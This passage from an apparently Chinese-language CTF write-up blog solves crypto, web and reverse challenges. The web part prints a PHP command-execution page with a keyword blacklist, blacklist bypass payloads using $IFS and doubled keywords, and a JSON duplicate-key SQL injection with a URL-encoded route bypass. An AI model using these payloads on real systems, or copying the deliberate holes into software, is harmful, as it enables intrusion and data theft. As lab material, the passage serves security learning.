gmpy2.invert(e,f)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"><span class="comment"># b&#x27;flag&#123;fbbce1e3aa690ebb49039241f940ed26&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="CLICK"><a href="#CLICK" class="headerlink" title="CLICK"></a>CLICK</h3><p>æŸ¥çœ‹æºç ï¼Œæ‰¾åˆ° <code>main.js</code>ï¼Œå‘ç° <code>ZmxhZ3thNTNlMTgzOC01OTczLTRlY2MtOWFjMC00ODZlOTA0NThhMTl9Cg==</code>ï¼Œbase64è§£ç å¾—flagã€‚</p><p>â€‹    </p><h3 id="Web-sign-in"><a href="#Web-sign-in" class="headerlink" title="Web-sign in"></a>Web-sign in</h3><p>æç¤ºrobotsåè®®ï¼Œè®¿é—® <code>robots.txt</code>ï¼Œå‘ç°å­˜åœ¨ <code>fiag_ls_h3re.php</code>ï¼Œ</p><p>è®¿é—®å‘ç°å³é”®è¢«ç¦ç”¨ï¼ŒåŠ å‰ç¼€ <code>view-source:</code> æŸ¥çœ‹æºç å¾—flagã€‚</p><p>â€‹    </p><h3 id="EXEC"><a href="#EXEC" class="headerlink" title="EXEC"></a>EXEC</h3><blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&quot;cmd&quot;</span>]))&#123;</span><br><span class="line">    <span class="variable">$shell</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;cmd&quot;</span>];</span><br><span class="line">    <span class="variable">$shell</span> = str_ireplace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = str_ireplace(<span class="string">&quot;\n&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = str_ireplace(<span class="string">&quot;\t&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = str_ireplace(<span class="string">&quot;?&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = str_ireplace(<span class="string">&quot;*&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = str_ireplace(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = str_ireplace(<span class="string">&quot;system&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = str_ireplace(<span class="string">&quot;passthru&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = str_ireplace(<span class="string">&quot;ob_start&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = str_ireplace(<span class="string">&quot;getenv&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = str_ireplace(<span class="string">&quot;putenv&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = str_ireplace(<span class="string">&quot;mail&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = str_ireplace(<span class="string">&quot;error_log&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = str_ireplace(<span class="string">&quot;`&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = str_ireplace(<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = str_ireplace(<span class="string">&quot;shell_exec&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = str_ireplace(<span class="string">&quot;echo&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = str_ireplace(<span class="string">&quot;cat&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = str_ireplace(<span class="string">&quot;ls&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = str_ireplace(<span class="string">&quot;nl&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = str_ireplace(<span class="string">&quot;tac&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = str_ireplace(<span class="string">&quot;bash&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = str_ireplace(<span class="string">&quot;sh&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = str_ireplace(<span class="string">&quot;tcp&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = str_ireplace(<span class="string">&quot;base64&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = str_ireplace(<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = str_ireplace(<span class="string">&quot;cp&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    exec(<span class="variable">$shell</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote><p>å¸¦é»‘åå•çš„æ— å›æ˜¾RCEï¼Œå¯ä»¥é‡å®šå‘å†™å‘½ä»¤æ‰§è¡Œç»“æœåˆ°æ–‡ä»¶ï¼Œå…³é”®å­—å¯åŒå†™ç»•è¿‡ï¼Œç©ºæ ¼ç”¨<code>$IFS</code>ç»•è¿‡ã€‚</p><p>åˆ—ç›®å½•ï¼š<code>?cmd=llss$IFS/&gt;1.txt</code>ï¼Œå¾—åˆ°æ ¹ç›®å½•flagæ–‡ä»¶å <code>ctf_is_fun_flag2021</code>ï¼›</p><p>è¯»æ–‡ä»¶ï¼š<code>?cmd=uniq$IFS/ctf_is_fun_flflagag2021&gt;1.txt</code>ï¼Œå¾—åˆ°flagã€‚</p><p>â€‹    </p><h3 id="Language"><a href="#Language" class="headerlink" title="Language"></a>Language</h3><p>æºç é‡Œæœ‰pythonå’Œgoä¸¤ä¸ªæ–‡ä»¶å¤¹ï¼Œæœ‰ä¸¤ä¸ªæœåŠ¡ï¼Œç«¯å£8000æ˜¯pythonå¼€çš„ï¼Œæ˜ å°„åˆ°å¯¹å¤–ç«¯å£ï¼›å†…ç½‘ç«¯å£5000æ˜¯goæœåŠ¡ã€‚pythonä»£ç ç›¸å½“äºä¸­è½¬ç«™æ¥å—å¤–ç½‘è¯·æ±‚ï¼Œå¤„ç†åè½¬å‘ç»™goï¼Œgoè¿›è¡Œåº•å±‚å¤„ç†ã€‚</p><p>goæœåŠ¡ä¸­å…³é”®ä»£ç  <code>backend.go</code>ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> controller</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">db <span class="string">&quot;ctf/database&quot;</span></span><br><span class="line"><span class="string">&quot;encoding/json&quot;</span></span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/buger/jsonparser&quot;</span></span><br><span class="line"><span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Language <span class="keyword">struct</span> &#123;</span><br><span class="line">Id  <span class="keyword">int32</span>  <span class="string">`json:&quot;id&quot;`</span></span><br><span class="line">Name <span class="keyword">string</span> <span class="string">`json:&quot;name&quot;`</span></span><br><span class="line">Votes <span class="keyword">int64</span> <span class="string">`json:&quot;votes&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Index</span><span class="params">(w http.ResponseWriter, _ *http.Request)</span></span> &#123;</span><br><span class="line">ok(w, <span class="string">&quot;Hello World!&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">List</span><span class="params">(w http.ResponseWriter, _ *http.Request)</span></span> &#123;</span><br><span class="line"></span><br><span class="line">rows, err := db.Sqlite.Query(<span class="string">&quot;SELECT * FROM languages;&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fail(w, <span class="string">&quot;Something wrong&quot;</span>)</span><br><span class="line">fmt.Println(err.Error())</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> rows.Close()</span><br><span class="line"></span><br><span class="line">res := <span class="built_in">make</span>([]Language, <span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> rows.Next() &#123;</span><br><span class="line"><span class="keyword">var</span> pl Language</span><br><span class="line">_ = rows.Scan(&amp;pl.Id, &amp;pl.Name, &amp;pl.Votes)</span><br><span class="line">res = <span class="built_in">append</span>(res, pl)</span><br><span class="line">&#125;</span><br><span class="line">err = json.NewEncoder(w).Encode(res)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Search</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">reqBody, _ := ioutil.ReadAll(r.Body)</span><br><span class="line"></span><br><span class="line">votes, err := jsonparser.GetInt(reqBody, <span class="string">&quot;votes&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fail(w, <span class="string">&quot;Error reading votes&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">name, err := jsonparser.GetString(reqBody, <span class="string">&quot;name&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fail(w, <span class="string">&quot;Error reading name&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">query := fmt.Sprintf(<span class="string">&quot;SELECT * FROM languages WHERE votes &gt;= %d OR name LIKE &#x27;%s&#x27;;&quot;</span>, votes, name)</span><br><span class="line">rows, err := db.Sqlite.Query(query)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fail(w, <span class="string">&quot;Something wrong&quot;</span>)</span><br><span class="line">fmt.Println(err.Error())</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">res := <span class="built_in">make</span>([]Language, <span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> rows.Next() &#123;</span><br><span class="line"><span class="keyword">var</span> pl Language</span><br><span class="line">_ = rows.Scan(&amp;pl.Id, &amp;pl.Name, &amp;pl.Votes)</span><br><span class="line">res = <span class="built_in">append</span>(res, pl)</span><br><span class="line">&#125;</span><br><span class="line">err = json.NewEncoder(w).Encode(res)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Flag</span><span class="params">(w http.ResponseWriter, r *http.Request )</span></span> &#123;</span><br><span class="line">action:= r.URL.Query().Get(<span class="string">&quot;action&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> action == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">fail(w, <span class="string">&quot;Error getting action&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">token:= r.URL.Query().Get(<span class="string">&quot;token&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> token == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">fail(w, <span class="string">&quot;Error getting token&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> secret <span class="keyword">string</span></span><br><span class="line">row := db.Sqlite.QueryRow(<span class="string">&quot;SELECT secret FROM token;&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err := row.Scan(&amp;secret); err != <span class="literal">nil</span> &#123;</span><br><span class="line">fail(w, <span class="string">&quot;Error querying secret token&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> action == <span class="string">&quot;readFlag&quot;</span> &amp;&amp; secret == token &#123;</span><br><span class="line">data, err := ioutil.ReadFile(<span class="string">&quot;flag&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fail(w, <span class="string">&quot;Error reading flag&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">ok(w, fmt.Sprintf(<span class="string">&quot;Congrats this is your flag: %s&quot;</span>, <span class="keyword">string</span>(data)))</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">ok(w, <span class="string">&quot;Wrong token&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è·¯ç”± <code>/flag</code> ä¸­GETä¸¤ä¸ªå‚æ•° <code>?action=readFlag&amp;token=xxxxx</code>ï¼Œtokenæ­£ç¡®å¾—flagï¼Œè€Œè·¯ç”± <code>/search</code> ä¸­å®¹æ˜“é€šè¿‡SQLæ³¨å…¥æ‹¿åˆ°tokenã€‚</p><p>pythonæœåŠ¡ä¸­ <code>app.py</code>ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, jsonify</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> unquote</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">server = <span class="string">&#x27;127.0.0.1:8000&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/list&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">listAll</span>():</span></span><br><span class="line">    r = requests.post(<span class="string">f&quot;http://<span class="subst">&#123;server&#125;</span>/api/list&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> jsonify(r.json())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/search&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">search</span>():</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;search.html&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        data = request.json</span><br><span class="line">        <span class="keyword">if</span> data[<span class="string">&#x27;name&#x27;</span>]:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(data[<span class="string">&#x27;name&#x27;</span>], <span class="built_in">str</span>) <span class="keyword">or</span> <span class="keyword">not</span> data[<span class="string">&#x27;name&#x27;</span>].isalnum():</span><br><span class="line">                <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;Bad word detected&quot;</span>&#125;)</span><br><span class="line">        <span class="keyword">if</span> data[<span class="string">&#x27;votes&#x27;</span>]:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(data[<span class="string">&#x27;votes&#x27;</span>], <span class="built_in">int</span>):</span><br><span class="line">                <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;Bad word detected&quot;</span>&#125;)</span><br><span class="line">        r = requests.post(<span class="string">f&quot;http://<span class="subst">&#123;server&#125;</span>/api/search&quot;</span>, data=request.data)</span><br><span class="line">        <span class="keyword">return</span> jsonify(r.json())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/healthcheck&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">healthCheck</span>():</span></span><br><span class="line">    getPath = [<span class="string">&quot;&quot;</span>, <span class="string">&quot;flag&quot;</span>]</span><br><span class="line">    postPath = [<span class="string">&quot;api/list&quot;</span>, <span class="string">&quot;api/search&quot;</span>]</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">for</span> path <span class="keyword">in</span> getPath:</span><br><span class="line">            requests.get(<span class="string">f&quot;http://<span class="subst">&#123;server&#125;</span>/<span class="subst">&#123;path&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> path <span class="keyword">in</span> postPath:</span><br><span class="line">            requests.post(<span class="string">f&quot;http://<span class="subst">&#123;server&#125;</span>/<span class="subst">&#123;path&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Down&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;OK&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&lt;path:path&gt;&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">handle</span>(<span class="params">path</span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> unquote(path):</span><br><span class="line">        action = request.args.get(<span class="string">&#x27;action&#x27;</span>)</span><br><span class="line">        token = request.args.get(<span class="string">&#x27;token&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(action)</span><br><span class="line">        <span class="keyword">if</span> action == <span class="string">&quot;readFlag&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;Sorry, readFlag is not permitted&quot;</span>&#125;)</span><br><span class="line">        r = requests.get(<span class="string">f&quot;http://<span class="subst">&#123;server&#125;</span>/<span class="subst">&#123;path&#125;</span>&quot;</span>, params=&#123;</span><br><span class="line">            <span class="string">&quot;action&quot;</span>: action,</span><br><span class="line">            <span class="string">&quot;token&quot;</span>: token</span><br><span class="line">        &#125;)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r = requests.get(<span class="string">f&quot;http://<span class="subst">&#123;server&#125;</span>/<span class="subst">&#123;path&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> jsonify(r.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure><p>å‘ç°å…¶ä¸­å­˜åœ¨ä¸¤ä¸ªç‚¹éœ€è¦ç»•è¿‡ï¼š</p><ol><li>è·¯ç”± <code>/search</code> ä¸­JSONä¸¥æ ¼è¿‡æ»¤ï¼Œ<code>name</code> çš„å€¼å¿…é¡»æ»¡è¶³ <code>isalnum()</code>ï¼Œ<code>votes</code> çš„å€¼å¿…é¡»ä¸ºæ•°å­—ï¼Œé¿å…SQLæ³¨å…¥æƒ…å†µï¼›</li><li>æ£€æµ‹urlé‡Œä½¿ç”¨GETæ–¹æ³•ä¼ å…¥ <code>action=readFlag</code> ä¼šç›´æ¥æ‹’ç»ã€‚</li></ol><p>å¯¹äºç¬¬1ç‚¹ï¼Œå°è¯•æ„é€ å«ä¸¤ä¸ª <code>name</code> å‚æ•°çš„JSONï¼Œåœ¨pythonä¸­è®¤JSONä¸­ç¬¬äºŒä¸ª <code>name</code>ï¼Œè€Œgoä¸­è®¤JSONä¸­ç¬¬ä¸€ä¸ª <code>name</code>ï¼Œåˆ©ç”¨è¿™ç§å·®å¼‚æ„é€ ï¼š<code>&#123;&quot;votes&quot;:1,&quot;name&quot;:&quot;-1&#39; union select 1,secret,3 from token --+&quot;,&quot;name&quot;:[]&#125;</code>ï¼Œç»•è¿‡å¾—åˆ°tokenå€¼ï¼Œå¾—åˆ° <code>re@l1y_4th_T0k3n</code>ã€‚</p><p>å¯¹äºç¬¬2ç‚¹ï¼Œåˆ©ç”¨ <code>@app.route(&quot;/&lt;path:path&gt;&quot;)</code> ç‰¹æ€§ï¼Œå¯¹ <code>?</code> è¿›è¡Œurlç¼–ç å¯ä»¥åœ¨pythonå±‚é¢ç»•è¿‡GETå‚æ•°è¯†åˆ«ï¼Œå³ <code>action = request.args.get(&#39;action&#39;)</code> ä¸ä¼šè·å–åˆ°å†…å®¹ï¼Œpayloadï¼š<code>/flag%3faction=readFlag&amp;token=re@l1y_4th_T0k3n</code>ã€‚</p><p>å¾—åˆ°flagï¼š<code>&quot;&#123;\&quot;msg\&quot;:\&quot;Congrats this is your flag: flag&#123;73c468d2-582e-4fdf-8be9-72efe6cbb9a2&#125;\\n\&quot;&#125;\n&quot;</code></p><p>â€‹    </p><h2 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h2><h3 id="hiahia-o-â–½-â”›"><a href="#hiahia-o-â–½-â”›" class="headerlink" title="hiahia o(*^â–½^*)â”›"></a>hiahia o(*^â–½^*)â”›</h3><p>IDAæŸ¥çœ‹ä¼ªç ï¼Œæ— é€†å‘ï¼Œç…§ç€å®ç°å°±è¡Œï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">s=<span class="built_in">list</span>(<span class="string">b&#x27;igdb~Mumu@p&amp;&gt;%;%&lt;$&lt;p&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flag</span>(<span class="params">c,k</span>):</span></span><br><span class="line">    <span class="keyword">if</span> k&gt;<span class="number">9</span>:</span><br><span class="line">        <span class="keyword">if</span> k&amp;<span class="number">1</span>==<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> c-<span class="number">11</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> c+<span class="number">13</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> k&amp;<span class="number">1</span>==<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> c-<span class="number">3</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> c+<span class="number">5</span></span><br><span class="line">t=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span 